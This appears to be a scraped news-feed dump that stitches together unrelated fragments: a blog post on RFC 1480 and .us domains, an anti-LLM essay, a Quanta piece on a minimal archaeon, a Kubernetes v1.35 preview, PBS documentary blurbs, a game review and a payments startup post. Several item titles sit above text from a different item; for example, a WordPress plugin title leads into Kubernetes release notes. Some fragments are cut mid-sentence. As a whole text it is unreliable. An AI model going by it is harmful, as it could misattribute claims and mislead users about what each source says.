formalize the existing practice. The idea of the k12.[state].us hierarchy
originated within IANA in consultation with InterNIC (newly created at
the time) and the Federal Networking Council, a now-defunct advisory
committee of federal agencies that made a number of important early
decisions about internet architecture.RFC 1480 is actually a revision on the slightly older RFC 1386, which
instead of saying that schools were already using the k12 domains, says that
"there ought to be a consistent scheme for naming them." It then says
that the k12 branch has been "introduced" for that purpose. RFC 1386 is
mostly silent on topics  than schools, so I think it was written
to document the decision made about schools with other details about
the use of locality-based domains left sketchy until the more thorough
RFC 1480.The decision to place "k12" under the state rather than under a municipality
or county might seem odd, but the RFC gives a reason. It's not unusual for
school districts, even those named after a municipality, to cover a larger
area than the municipality itself. Albuquerque Public Schools operates
schools in the East Mountains; Portland Public Schools operates schools
across multiple counties and beyond city limits. Actually the RFC gives
exactly that second one as an example:For example, the Portland school
district in Oregon, is in three or four counties.  Each of those
counties also has non-Portland districts.I include that quote mostly because I think it's funny that the authors
now know what state Portland is in. When you hear "DNS" you think Jon
Postel, at least if you're me, but RFC 1480 was written by Postel along
with a less familiar name, Ann Westine Cooper. Cooper was a coworker of
Postel at USC, and RFC 1480 very matter-of-factly names the duo of
Postel and Cooper as the administrator of the .US TLD. That's interesting
considering that almost five years later Postel would become involved in
a notable conflict with the federal government over control of DNS---one
of the events that precipitated today's eccentric model of public-private
DNS governance.There are other corners of the RFC 1480 scheme that were not contemplated
in 1993, and have managed to outlive many of the names that were. Consider,
for example, our indigenous nations: these are an exception to the normal
political hierarchy of the US. The Navajo Nation, for example, exists in a
state that is often described as parallel to a state, but isn't really.
Native nations are sovereign, but are also subject to federal law by
statute, and subject to state law by various combinations of statute,
jurisprudence, and bilateral agreement. I didn't really give any detail
there and I probably still got something wrong, such is the complicated
legal history and present of Native America. So where would a native
sovereign government put their website? They don't fall under the
traditional realm of .gov, federal government, nor do they fall under a
state-based hierarchy. Well, naturally, the Navajo Nation is found at
navajo-nsn.gov.We can follow the "navajo" part but the "nsn" is odd, unless they spelled
"nation" wrong and then abbreviated it, which I've always thought is what
it looks like on first glance. No, this domain name is very much an artifact
of history. When the problem of sovereign nations came to Postel and Cooper,
the solution they adopted was a new affinity group, like "fed" and "k12"
and "lib": "nsn", standing for Native Sovereign Nation. Despite being a
late comer, nsn.us probably has the most enduring use of any part of the
RFC 1480 concept. Dozens of pueblos, tribes, bands, and confederations
still use it. squamishtribe.nsn.us, muckleshoot.nsn.us, ctsi.nsn.us,
sandiapueblo.nsn.us.Yet others have moved away... in a curiously "partial" fashion. navajo-nsn.gov
as we have seen, but an even more interesting puzzler is tataviam-nsn.us. It's
only one character away from a "standardized" NSN affinity group locality domain,
but it's so far away. As best I can tell, most of these governments initially
adopted "nsn.us" names, which cemented the use of "nsn" in a similar way to "state"
or "city" as they appear in many .gov domains to this day. Policies on .gov
registration may be a factor as well, the policies around acceptable .gov names
seem to have gone through a long period of informality and then changed a number
of times. Without having researched it too deeply, I have seen bits and pieces
that make me think that at various points NTIA has preferred that .gov domains
for non-federal agencies have some kind of qualifier to indicate their "level"
in the political hierarchy. In any case, it's a very interesting situation because
"native sovereign nation" is not otherwise a common term in US government.
It's not like lawyers or lawmakers broadly refer to tribal governments as NSNs,
the term is pretty much unique to the domain names.So what ever happened to locality-based names? RFC 1480 names have fallen
out of favor to such an extent as to be considered legacy by many of their
users. Most Americans are probably not aware of this name hierarchy at all,
despite it ostensibly being the unified approach for this country. In
short, it failed to take off, and those sectors that had widely adopted it
(such as schools) have since moved away. But why?I put a lot of time into writing this, and I hope that you enjoy reading
it. If you can spare a few dollars, consider supporting me on
ko-fi. You'll receive an occasional extra,
subscribers-only post, and defray the costs of providing artisanal, hand-built
world wide web directly from Albuquerque, New Mexico.As usual, there seem to be a few reasons. The first is user-friendliness.
This is, of course, a matter of opinion---but anecdotally, many people
seem to find deeply hierarchical domain names confusing. This may be a
self-fulfilling prophecy, since the perception that multi-part DNS names
are user-hostile means that no one uses them which means that no users
are familiar with them. Maybe, in a different world, we could have broken
out of that loop. I'm not convinced, though. In RFC 1480, Postel and
Cooper argue that a deeper hierarchy is valuable because it allows for
more entities to have their "obviously correct" names. That does make
sense to me, splitting the tree up into more branches means that there is
less name contention within each branch. But, well, I think it might be
the kind of logic that is intuitive only those who work in computing.
For the general public, I think long multi-part names quickly become
difficult to remember and difficult to type. When you consider the dollar
amounts that private companies have put into dictionary word domain names,
it's no surprise that government agencies tend to prefer one-level names
with full words and simple abbreviations.I also think that the technology outpaced the need that RFC 1480 was
intended to address. The RFC makes it very clear that Postel and Cooper
were concerned about the growing size of the internet, and expected the
sheer number of organizations going online to make maintenance of the DNS
impractical. They correctly predicted the explosion of hosts, but not the
corresponding expansion of the DNS bureaucracy. Between the two versions
of the .us RFC, DNS operations were contracted to Network Solutions. This
began a winding path that lead to delegation of DNS zones to various
private organizations, most of which fully automated registration and
delegation and then federated it via a common provisioning protocol. The
size of, say, the .com zone really did expand beyond what DNS's designers
had originally anticipated... but it pretty much worked out okay. The
mechanics of DNS's maturation probably had a specifically negative effect
on adoption of .us, since it was often under a different operator from the
"major" domain names and not all "registrars" initially had access.Besides, the federal government never seems to have been all that on board
with the concept. RFC 1480 could be viewed as a casualty of the DNS wars,
a largely unexplored path on the branch of DNS futures that involved IANA
becoming completely independent of the federal government. That didn't
happen. Instead, in 2003 .gov registration was formally opened to municipal,
state, and tribal governments. It became federal policy to encourage use of
.gov for trust reasons (DNSSEC has only furthered this), and .us began to fall by the wayside.That's not to say that RFC 1480 names have ever gone away. You can still
find many of them in use. state.nm.us doesn't have an A record, but governor.state.nm.us
and a bunch of other examples under it do. The internet is littered
with these locality-based names, many of them hiding out in smaller
agencies and legacy systems. Names are hard to get right, and one of the reasons is
that they're very hard to get rid of.When things are bigger, names have to be longer.  There is an
argument that with only 8-character names, and in each position allow
a-z, 0-9, and -, you get 37**8 = 3,512,479,453,921 or 3.5 trillion
possible names.  It is a great argument, but how many of us want
names like "xs4gp-7q".  It is like license plate numbers, sure some
people get the name they want on a vanity plate, but a lot more
people who want something specific on a vanity plate can't get it
because someone else got it first.  Structure and longer names also
let more people get their "obviously right" name.You look at Reddit these days and see all these usernames that are two
random words and four random numbers, and you see that Postel and Cooper
were right. Flat namespaces create a problem, names must either be complex
or long, and people don't like it either. What I think they got wrong, at
a usability level, is that deep hierarchies still create names that are

ABSTRACT
The backend has all the data. It has access to all the databases, the flat files and the remote storage APIs. But if you want to look at that data, it feels like you're forced to build yet another REST API and hire a React expert.

No more! Streamlit has you covered. Streamlit's a simple Python framework that makes it incredibly easy to take Python's data-processing capabilities and build clean, professional visualisations in minutes.

In this live-coding session we'll start completely from scratch and explore the core parts of Streamlit's API, learn a little Pandas along the way, and see how a backend developer or data scientist can actually look at their data faster than you can say, "JSON encoding". [...]

The topic shifted to the use of “AI” for everyday tasks, people casually started elaborating on how they use “chat assistants” to let them write pieces of code or annoying emails. The situation is a blueprint for many conversations I had in recent months. What followed in most of them, almost like a reflex, was a self-justification of why the way  use these tools is fine, while other approaches were reckless.I find it particularly disillusioning to realize how deep the LLM brainworm is able to eat itself even into progressive hacker circles.I encountered friends who got fully sucked into the belly of the . Proficient, talented coders who seem to experience some sort of existential crisis. Staring at the screen in disbelief, unable to let go of Cursor, or whatever tool is  right now. Soaking in an unconscious state of harmful coping. Seeing that felt terrifyingly close to witnessing a friend developing a drinking problem.And yeah, I get it. We programmers are currently living through the devaluation of our craft, in a way and rate we never anticipated possible. A fate that designers, writers, translators, tailors or book-binders lived through before us. Not that their craft would die out, but it would be mutilated — condemned to the grueling task of cleaning up what the machines messed up. Unsurprisingly, some of us are not handling the new realities well.I personally don’t touch LLMs with a stick. I don’t let them near my brain. Many of my friends share that sentiment.But I think it’s important to acknowledge that we’re in a priviliged situation to be able to do so. People are forced to use these systems — by UI patterns, bosses expectations, knowledge polution making it increasingly hard to learn things, or just peer pressure. The world adapts to these technologies, and not using them can be a substantial disadvantage in school, university, or anywhere.A lot of the public debate about AI focuses on the quality of its output. Calling out biases, bullshit marketing pledges, making fun of the fascinating ways in which they fail, and so on. Of course, the practical issues are important to discuss, but we shouldn’t lean too much on that aspect in our philosophy and activisim, or we risk missing the actual agenda of AI.No matter how well “AI” works, it has some deeply fundamental problems, that won’t go away with technical progress. I’d even go as far and say they are intentional.Our ability to use tools is an integral part of the human experience. They allow us to do things that we otherwise couldn’t do. They shape how we think, and consequently who we are.When we use a tool, it becomes part of us. That’s not just the case for hammers, pens, or cars, but also for a notebook used to organize thoughts. It becomes part of our cognitive process. Computer are not different. While I’m typing this text, my fingers are flying over the keyboard, switching windows, opening notes, looking up words in a dictionary. All while I’m fully focused on the meta-task of getting my thoughts out, unaware of all the tiny miracles happening.Our minds are susceptible to outside cues. When we read news articles we tend to believe what seems plausible. When we review code we generally expect it to behave the way it looks, even when we don’t have the context to assess that. The same is true for text: When we let a model transform notes into a blog post, a lot of context and nuance is added. We read it and believe the output to be what we thought. It’s subtle.on a deeper level, writing is more than just the process by which you obtain a piece of text, right? it’s also about finding out what you wanted to say in the first place, and how you wanted to say it. this post existed in my head first as a thought, then it started to gel into words, and then i tried pulling those words out to arrange them in a way that (hopefully) gets my point across. there is nothing extra there, no filler. i alone can get the thought out and writing is how i do that.In a world where fascists redefine truth, where surveillance capitalist companies, more powerful than democratically elected leaders, exert control over our desires, do we really want their machines to become part of our thought process? To share our most intimate thoughts and connections with them?AI systems exist to reinforce and strengthen existing structures of power and violence. They are the wet dream of capitalists and fascists. Enormous physical infrastructure designed to convert capital into power, and back into capital. Those who control the infrastructure, control the people subject to it.AI systems being egregiously resource intensive is not a side effect — Craft, expression and skilled labor is what produces value, and that gives us control over ourselves. In order to further centralize power, craft and expression need to be destroyed. And they sure are trying.How can we be ourselves in this world? What we’re dealing with here are not questions about AI, but about survival under metastatic capitalism. Shit’s dire, but there are things we can do. I’m working on a post about that.Until then, here are some starting points:Be there for the people around you. Message friends and show them that they matter to youOrganize in a union. Together we are stronger.Take care of your mind. Spend less time on social media. Use the freed capacity to educate yourself, go read a book The most disobedient thing we can do is to thrive. ]]></content:encoded></item><item><title>A cell so minimal that it challenges definitions of life</title><link>https://www.quantamagazine.org/a-cell-so-minimal-that-it-challenges-definitions-of-life-20251124/</link><author>ibobev</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 10:06:41 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[“The diversity of archaea and bacteria that appear to belong to these supergroups of parasitic organisms is very, very large,” she said. For bacteria, it may be between 25% and 50% of the group’s total share of species, she suggested.The discovery pushes the boundaries of our knowledge of just how small and simple cellular life can become, as it evolves even into forms that are barely alive.An Extraordinary DiscoveryNakayama has built a scientific career out of looking more closely than other researchers typically do. He considers an already tiny cell and wonders: Are there even smaller cells that make a home there?“The difference [in size between parasitic and host cells] can sometimes be like that between a human and Godzilla,” Nakayama said. He is fascinated by the potentially vast amount of undiscovered biodiversity these relationships might contain, and his lab looks for such relationships in seawater. The ocean is a nutrient-poor environment that incentivizes cells to form trading partnerships. Sometimes they float along together, loosely tethered, exchanging rare nutrients and energy. Other times their arrangements are more organized. is a globally widespread single-celled dinoflagellate that has a walled, pouchlike external chamber for housing symbiotic cyanobacteria. Nakayama and his team searched for the alga by scooping seawater samples from the Pacific Ocean using a fine-mesh net. A common technique is to sequence whatever DNA can be found in the soup of such a sample, an approach called metagenomics.“That method is incredibly powerful for capturing a broad overview,” Nakayama said. “However, with such data, it is often difficult to maintain the link between a sequence and the specific cell it came from, and rare organisms can be easily missed.” His team’s more targeted approach involves microscopically identifying and physically isolating a single target cell from that mixed sample.Back on shore in the Tsukuba lab, after the researchers confirmed they had , they sequenced every genome associated with that one cell. As expected, they found DNA from its symbiotic cyanobacteria, but they found something else, too: sequences that belong to an archaeon, a member of the domain of life thought to have given rise to eukaryotes like us.At first, Nakayama and his colleagues thought they had made a mistake. The archaeal genome is tiny: just 238,000 base pairs end to end. In comparison, humans have a few billion base pairs, and even  bacteria work with several million. (’ symbiotic cyanobacteria have 1.9 million base pairs.) Previously, the smallest known archaeal genome was the one belonging to  at 490,000 base pairs, it is more than twice as long as the new one the researchers found. They initially figured that this tiny genome — too large to be merely statistical noise — was an abbreviated piece of a much larger genome, erroneously compiled by their software.“At first, we suspected it might be an artifact of the genome-assembly process,” Nakayama recalled. To check, the team sequenced the genome using different technologies and ran the data through multiple computer programs that assemble fragments of DNA sequences into a full genome. The various approaches all reconstructed the exact same 238,000-base-pair circular genome. “This consistency is what convinced us it was the real, complete genome,” he said.This meant that Nakayama and his team had a new organism on their hands. They named the microbe  Sukunaarchaeum mirabile (hereafter referred to as Sukunaarchaeum) for its remarkably tiny genome — after Sukuna-biko-na, a Shinto deity notable for his short stature, plus a Latin word for “extraordinary.”The Spectrum of Quasi-LifeWhen the team consulted databases of known genes to analyze the archaeon, they found its small size was the result of a whole lot that was missing.Sukunaarchaeum encodes the barest minimum of proteins for its own replication, and that’s about all. Most strangely, its genome is missing any hints of the genes required to process and build molecules, outside of those needed to reproduce. Lacking those metabolic components, the organism must outsource the processes for growth and maintenance to another cell, a host upon which the microbe is entirely dependent.Other symbiotic microbes have scrapped much of their genomes, including Sukunaarchaeum’s evolutionary relatives. The researchers’ analysis suggested that the microbe is part of the DPANN archaea, sometimes called nanoarchaea or ultra-small archaea, which are characterized by small size and small genomes. DPANN archaea are generally thought to be symbiotes that cling to the outside of larger prokaryotic microbes, and plenty of them have substantially reduced genomes to match that lifestyle. But until now, none of the DPANN species had genomes quite this pared back. And Sukunaarchaeum branched off the DPANN lineage early, suggesting that it had taken its own evolutionary journey.“This realm of the archaea is pretty mysterious in general,” said Brett Baker, a microbial ecologist at the University of Texas, Austin who was not involved in the work. “[DPANN archaea are] obviously limited in their metabolic capabilities.”While Sukunaarchaeum may provide some undetermined benefit for its host — which could be , the symbiotic cyanobacteria or another cell entirely — it’s probably a self-absorbed parasite. “Its genome reduction is driven by entirely selfish motives, consistent with a parasitic lifestyle,” said Tim Williams, a microbiologist at the University of Technology Sydney who was not involved in the study. It cannot contribute metabolic products, so the relationship between Sukunaarchaeum and any other cell would likely be a one-way street.Other microbes have evolved similarly extreme, streamlined forms. For instance, the bacterium , which lives as a symbiont within the guts of sap-feeding insects, has an even smaller genome than Sukunaarchaeum, at around 159,000 base pairs. However, these and other super-small bacteria have metabolic genes to produce nutrients, such as amino acids and vitamins, for their hosts. Instead, their genome has cast off much of their ability to reproduce on their own.“They are on the way to becoming organelles. This is the way mitochondria and chloroplasts are thought to have evolved,” Williams said. “But Sukunaarchaeum has gone in the opposite direction: The genome retains genes required for its own propagation, but lost most, if not all, of its metabolic genes.”]]></content:encoded></item><item><title>20th Century Keyboard Trailer</title><link>https://www.youtube.com/watch?v=SIVxfOUMV4U</link><author>Chyrosran22</author><category>yt</category><enclosure url="https://www.youtube.com/v/SIVxfOUMV4U?version=3" length="" type=""/><pubDate>Wed, 26 Nov 2025 09:25:55 +0000</pubDate><source url="https://www.youtube.com/channel/UCD0y51PJfvkZNe3y3FR5riw">Chyrosran22</source><content:encoded><![CDATA[22-12-2025 (unboxing before that)

from the Oscar®-winning team behind “20 Days in Mariupol.”

This journalism is made possible by viewers like you. Support your local PBS station here: https://www.pbs.org/donate​.

“2000 Meters to Andriivka” documents the toll of the Russia-Ukraine war from a personal and devastating vantage point. Following his historic account of the civilian toll in Mariupol, Ukrainian filmmaker and Associated Press journalist Mstyslav Chernov turns his lens towards Ukrainian soldiers — who they are, where they came from, and the impossible decisions they face in the trenches as they fight for every inch of their land.

The documentary follows a Ukrainian brigade battling through approximately one mile of a heavily fortified forest on their mission to liberate the Russian-occupied village of Andriivka amid a failing counteroffensive in 2023. 

Weaving together original footage, intensive Ukrainian Army bodycam video and powerful moments of reflection with haunting intimacy, the documentary reveals how the farther the soldiers advance through their destroyed homeland, the more they realize that, for them, this war may never end.

“2000 Meters to Andriivka” is written, filmed and directed by filmmaker and Associated Press journalist Mstyslav Chernov. It is produced by Chernov, FRONTLINE’s senior documentary editor and producer Michelle Mizner and FRONTLINE’s editor-in-chief and executive producer Raney Aronson-Rath. It is edited by Michelle Mizner. The film is co-produced and includes additional cinematography by AP journalist Alex Babenko, and is composed by two-time Grammy Award®-winning composer and music-producer Sam Slater. Distributed domestically by PBS Distribution and internationally by Dogwoof, “2000 Meters to Andriivka” is a FRONTLINE FEATURES and The Associated Press production.]]></content:encoded></item><item><title>Show HN: A WordPress plugin that rewrites image URLs for near-zero-cost delivery</title><link>https://wordpress.org/plugins/bandwidth-saver/</link><author>cr1st1an</author><category>dev</category><category>hn</category><pubDate>Wed, 26 Nov 2025 02:05:36 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[WordPress images often load slowly, especially on shared hosting.

The information below is based on the current status of the v1.35 release and is subject to change before the final release date.Deprecations and removals for Kubernetes v1.35On Linux nodes, container runtimes typically rely on cgroups (short for "control groups").
Support for using cgroup v2 has been stable in Kubernetes since v1.25, providing an alternative to the original v1 cgroup support. While cgroup v1 provided the initial resource control mechanism, it suffered from well-known
inconsistencies and limitations. Adding support for cgroup v2 allowed use of a unified control group hierarchy, improved resource isolation, and served as the foundation for modern features, making legacy cgroup v1 support ready for removal.
The removal of cgroup v1 support will only impact cluster administrators running nodes on older Linux distributions that do not support cgroup v2; on those nodes, the  will fail to start. Administrators must migrate their nodes to systems with cgroup v2 enabled. More details on compatibility requirements will be available in a blog post soon after the v1.35 release.Deprecation of ipvs mode in kube-proxyMany releases ago, the Kubernetes project implemented an ipvs mode in . It was adopted as a way to provide high-performance service load balancing, with better performance than the existing  mode. However, maintaining feature parity between ipvs and other kube-proxy modes became difficult, due to technical complexity and diverging requirements. This created significant technical debt and made the ipvs backend impractical to support alongside newer networking capabilities.The Kubernetes project intends to deprecate kube-proxy  mode in the v1.35 release, to streamline the  codebase. For Linux nodes, the recommended  mode is already nftables.Kubernetes is deprecating containerd v1.y supportWhile Kubernetes v1.35 still supports containerd 1.7 and other LTS releases of containerd, as a consequence of automated cgroup driver detection, the Kubernetes SIG Node community has formally agreed upon a final support timeline for containerd v1.X. Kubernetes v1.35 is the last release to offer this support (aligned with containerd 1.7 EOL).This is a final warning that if you are using containerd 1.X, you must switch to 2.0 or later before upgrading Kubernetes to the next version. You are able to monitor the kubelet_cri_losing_support metric to determine if any nodes in your cluster are using a containerd version that will soon be unsupported.Featured enhancements of Kubernetes v1.35The following enhancements are some of those likely to be included in the v1.35 release. This is not a commitment, and the release content is subject to change.When scheduling Pods, Kubernetes uses node labels, taints, and tolerations to match workload requirements with node capabilities. However, managing feature compatibility becomes challenging during cluster upgrades due to version skew between the control plane and nodes. This can lead to Pods being scheduled on nodes that lack required features, resulting in runtime failures.The  framework will introduce a standard mechanism for nodes to declare their supported Kubernetes features. With the new alpha feature enabled, a Node reports the features it can support, publishing this information to the control plane through a new  field. Then, the , admission controllers and third-party components can use these declarations. For example, you can enforce scheduling and API validation constraints, ensuring that Pods run only on compatible nodes.This approach reduces manual node labeling, improves scheduling accuracy, and prevents incompatible pod placements proactively. It also integrates with the Cluster Autoscaler for informed scale-up decisions. Feature declarations are temporary and tied to Kubernetes feature gates, enabling safe rollout and cleanup.Targeting alpha in v1.35,  aims to solve version skew scheduling issues by making node capabilities explicit, enhancing reliability and cluster stability in heterogeneous version environments.To learn more about this before the official documentation is published, you can read KEP-5328.In-place update of Pod resourcesKubernetes is graduating in-place updates for Pod resources to General Availability (GA). This feature allows users to adjust  and  resources without restarting Pods or Containers. Previously, such modifications required recreating Pods, which could disrupt workloads, particularly for stateful or batch applications.
Previous Kubernetes releases already allowed you to change infrastructure resources settings (requests and limits) for existing Pods. This allows for smoother vertical scaling, improves efficiency, and can also simplify solution development.The Container Runtime Interface (CRI) has also been improved, extending the  API for Windows and future runtimes while allowing  to report real-time resource configurations. Together, these changes make scaling in Kubernetes faster, more flexible, and disruption-free.
The feature was introduced as alpha in v1.27, graduated to beta in v1.33, and is targeting graduation to stable in v1.35.When running microservices, Pods often require a strong cryptographic identity to authenticate with each other using mutual TLS (mTLS). While Kubernetes provides Service Account tokens, these are designed for authenticating to the API server, not for general-purpose workload identity.Before this enhancement, operators had to rely on complex, external projects like SPIFFE/SPIRE or cert-manager to provision and rotate certificates for their workloads. But what if you could issue a unique, short-lived certificate to your Pods natively and automatically? KEP-4317 is designed to enable such native workload identity. It opens up various possibilities for securing pod-to-pod communication by allowing the  to request and mount certificates for a Pod via a projected volume.This provides a built-in mechanism for workload identity, complete with automated certificate rotation, significantly simplifying the setup of service meshes and other zero-trust network policies. This feature was introduced as alpha in v1.34 and is targeting beta in v1.35.Numeric values for taintsKubernetes is enhancing taints and tolerations by adding numeric comparison operators, such as  (Greater Than) and  (Less Than).Previously, tolerations supported only exact () or existence () matches, which were not suitable for numeric properties such as reliability SLAs.With this change, a Pod can use a toleration to "opt-in" to nodes that meet a specific numeric threshold. For example, a Pod can require a Node with an SLA taint value greater than 950 (, ).This approach is more powerful than Node Affinity because it supports the NoExecute effect, allowing Pods to be automatically evicted if a node's numeric value drops below the tolerated threshold.When running Pods, you can use  to drop privileges, but containers inside the pod often still run as root (UID 0). This simplicity poses a significant challenge, as that container UID 0 maps directly to the host's root user.Before this enhancement, a container breakout vulnerability could grant an attacker full root access to the node. But what if you could dynamically remap the container's root user to a safe, unprivileged user on the host? KEP-127 specifically allows such native support for Linux User Namespaces. It opens up various possibilities for pod security by isolating container and host user/group IDs. This allows a process to have root privileges (UID 0) within its namespace, while running as a non-privileged, high-numbered UID on the host.Released as alpha in v1.25 and beta in v1.30, this feature continues to progress through beta maturity, paving the way for truly "rootless" containers that drastically reduce the attack surface for a whole class of security vulnerabilities.Support for mounting OCI images as volumesWhen provisioning a Pod, you often need to bundle data, binaries, or configuration files for your containers.
Before this enhancement, people often included that kind of data directly into the main container image, or required a custom init container to download and unpack files into an . You can still take either of those approaches, of course.But what if you could populate a volume directly from a data-only artifact in an OCI registry, just like pulling a container image? Kubernetes v1.31 added support for the  volume type, allowing Pods to pull and unpack OCI container image artifacts into a volume declaratively.This allows for seamless distribution of data, binaries, or ML models using standard registry tooling, completely decoupling data from the container image and eliminating the need for complex init containers or startup scripts.
This volume type has been in beta since v1.33 and will likely be enabled by default in v1.35.New features and deprecations are also announced in the Kubernetes release notes. We will formally announce what's new in Kubernetes v1.35 as part of the CHANGELOG for that release.The Kubernetes v1.35 release is planned for .

What started as using AI for tedious chores — meal plans, grocery lists, quick research — quietly morphed into hours talking to a chatbot. And Adam isn’t alone. As chatbots get better at flattery, emotional support, and companionship, researchers are seeing more users (including teens) slip into dependency without realizing it.

Adam unpacks how chatbots are designed to keep us coming back, why young people are especially vulnerable, and what happens when adults can’t walk away — in some cases, leading to severe mental health crises.

There are lots of reasons to search for planets around other stars—exoplanets. A big one is to find other places in the universe that might harbor life. We only know of one such planet so far: Earth. And so we get particularly excited when we find Earth-mass planets at the right distance from their star to sustain liquid water—also critical for life as we know it. We’ve found lots of those “habitable” worlds. But we also don’t know what factors are really critical to the initial development of life. Maybe star type? We get even more excited if that Earth-mass at the right distance from a Sun-type star. We’ve found a few of those too, and we can infer that there are lots more.

Or at least a mental stand-in for her as she explores the furthest corners of her impressive mind palace--a surprisingly beautiful backdrop for a 2D action-adventure game that delves into the trauma of burnout. Armed with nothing more than a paintbrush, Constance bashes and dashes through the physical manifestation of her decaying mental health and clashes against her inner demons. It's a narrative with memorable moments but not an abundantly clear throughline, and an adventure that makes a few missteps throughout. Still, when Constance slows down long enough to allow you to appreciate its splendor and think through its platforming puzzles, it's often a marvel to behold.The story of Constance draws clear parallels to the likes of Celeste or Tales of Kenzera: Zau, dispensing emotional gut-punches in the quiet moments between the frenetic platforming. But unlike these comparisons, Constance's story isn't linear. This greatly enhances the game's metroidvania inspirations, opening up the beautifully hand-drawn world to be explored and overcome in nearly any direction you want after beating the first boss, but it makes it harder to follow the protagonist's growth and relate to her overall journey.Compounding those problems, none of the characters in Constance are all that memorable or feel enough like people. Many of them ask Constance for help with their problems--which play out as optional side quests--but these quests don't lead to substantial revelations or gift anything necessary to beat the game. The quests (and thus the characters) feel like unnecessary fluff and are subsequently not important enough to interact with. Perhaps more of a selfish desire on my part, but it's such a shame how little there is to the story's characters. Without anyone for Constance to narratively bounce off of, it leaves her feeling flat as well. The situations we see her endure in her real life are still emotional, but because Constance doesn't feel like a person, they lose the relatability. I cared less and less about Constance as the game went on, playing the game for the pleasure of beating a platformer, not to meaningfully engage with its narrative of burnout.Continue Reading at GameSpot]]></content:encoded></item><item><title>My favourite Picasso quote as featured in my latest video</title><link>https://www.youtube.com/shorts/9qsAATFN4RI</link><author>Shawn Grenier | The Canvas</author><category>yt</category><enclosure url="https://www.youtube.com/v/9qsAATFN4RI?version=3" length="" type=""/><pubDate>Tue, 25 Nov 2025 19:40:49 +0000</pubDate><source url="https://www.youtube.com/channel/UCqTHx0ObkFZ97KO2SWUuz9w">Shawn Grenier | The Canvas</source><content:encoded><![CDATA[My Letterboxd: https://boxd.it/4bApF

This journalism is made possible by viewers like you. Support your local PBS station here: https://www.pbs.org/donate

The soldier, who went by the call sign “Sheva,”  was part of the Ukrainian platoon at the heart of "2000 Meters to Andriivka," the new feature documentary from FRONTLINE, The Associated Press and the Academy Award-winning team behind "20 Days in Mariupol."

Weaving together quiet moments of reflection, like this one with Sheva, and vivid battle footage, "2000 Meters to Andriivka" documents the toll of the Russia-Ukraine war from a personal and devastating vantage point. The film follows Ukraine’s 3rd Assault Brigade as it carries out a grueling, meter-by-meter counteroffensive that aims to retake the strategic Ukrainian town of Andriivka from Russia -- and as the soldiers realize that for them, the war may never end.

Sheva would be killed in a battle and die in a hospital five months after this scene was filmed. Read more about Sheva's story at pbs.org/frontline, and watch the full documentary on @frontline starting Nov. 25, 2025.

“2000 Meters to Andriivka” is written, filmed and directed by filmmaker and Associated Press journalist Mstyslav Chernov. It is produced by Chernov, FRONTLINE’s senior documentary editor and producer Michelle Mizner and FRONTLINE’s editor-in-chief and executive producer Raney Aronson-Rath. It is edited by Michelle Mizner. The film is co-produced and includes additional cinematography by AP journalist Alex Babenko; is composed by two-time Grammy Award®-winning composer and music-producer Sam Slater; and is executive produced by Raney Aronson-Rath and the AP's Derl McCrudden. Distributed domestically by PBS Distribution and internationally by Dogwoof, “2000 Meters to Andriivka” is a FRONTLINE FEATURES and The Associated Press production.

For the past bit we’ve been building Flowglad (https://flowglad.com) and can now feel it’s just gotten good enough to share with you all:Flowglad is a payment processor that you integrate without writing any glue code. Along with processing your payments, it tells you in real time the features and usage credit balances that your customers have available to you based on their billing state. The DX feels like React, because we wanted to bring the reactive programming paradigm to payments.We make it easy to spin up full-fledged pricing models (including usage meters, feature gates and usage credit grants) in a few clicks. We schematize these pricing models into a pricing.yaml file that’s kinda like Terraform but for your pricing.The result is a payments layer that AI coding agents have a substantially easier time one-shotting (for now the happiest path is a fullstack Typescript + React app).- After a decade of building on Stripe, we found it powerful but underopinionated. It left us doing a lot of rote work to set up fairly standard use cases
- That meant more code to maintain, much of which is brittle because it crosses so many server-client boundaries
- Not to mention choreographing the lifecycle of our business domain with the Stripe checkout flow and webhook event types, of which there are 250+
- Payments online has gotten complex - not just new pricing models for AI products, but also cross border sales tax, etc. You either need to handle significant chunks of it yourself, or sign up for and compose multiple servicesThis all feels unduly clunky, esp when compared to how easy other layers like hosting and databases have gotten in recent years.These patterns haven’t changed much in a decade. And while coding agents can nail every other rote part of an app (auth, db, analytics), payments is the scariest to tab-tab-tab your way through. Because the the existing integration patterns are difficult to reason about, difficult to verify correctness, and absolutely mission critical.Our beta version lets you:- Spin up common pricing models in just a few clicks, and customize them as needed
- Clone pricing models between testmode and live mode, and import / export via pricing.yaml
- Check customer usage credits and feature access in real time on your backend and React frontend
- Integrate without any DB schema changes - you reference your customers via your ids, and reference prices, products, features and usage meters via slugs that you defineWe’re still early in our journey so would love your feedback and opinions. Billing has a lot of use cases, so if you see anything that you wish we supported, please let us know!]]></content:encoded></item><item><title>Why the World’s Wealthiest Are Sending Their Gold to Singapore | WSJ</title><link>https://www.youtube.com/watch?v=qf-tkyydSCc</link><author>The Wall Street Journal</author><category>news</category><enclosure url="https://www.youtube.com/v/qf-tkyydSCc?version=3" length="" type=""/><pubDate>Tue, 25 Nov 2025 17:01:37 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">News - Wall Street Journal</source><content:encoded><![CDATA[As gold prices surge to a record $4,000, more of the world’s wealthiest from places like Europe, the U.S. and Australia are storing their gold in Singapore in vaults like The Reserve.

Forty percent of white Virginians owned enslaved people, and farmers like George Washington lived in fear of a revolt. These fears come to reality when Virginia's royal governor, Lord Dunmore, issues a proclamation offering freedom to any enslaved individual who joins his fight against their Patriot masters. Some 800 men would join Dunmore, including some of George Washington's own slaves.

THE AMERICAN REVOLUTION | A Film By Ken Burns, Sarah Botstein and David Schmidt
An expansive look at the virtues and contradictions of the war and the birth of the United States of America, the film follows dozens of figures from a wide variety of backgrounds. Through their individual stories, viewers experience the war through the memories of the men and women who experienced it: the rank-and-file Continental soldiers and American militiamen (some of them teenagers), Patriot political and military leaders, British Army officers, American Loyalists, Native soldiers and civilians, enslaved and free African Americans, German soldiers in the British service, French and Spanish allies, and various civilians living in North America, Loyalist as well as Patriot, including many made refugees by the war.

The Revolution began a movement for people around the world to imagine new and better futures for themselves, their nations, and for humanity. It declared American independence with promises that we continue to strive for. The American Revolution opened the door to advance civil liberties and human rights, and it asked questions that we are still trying to answer today.

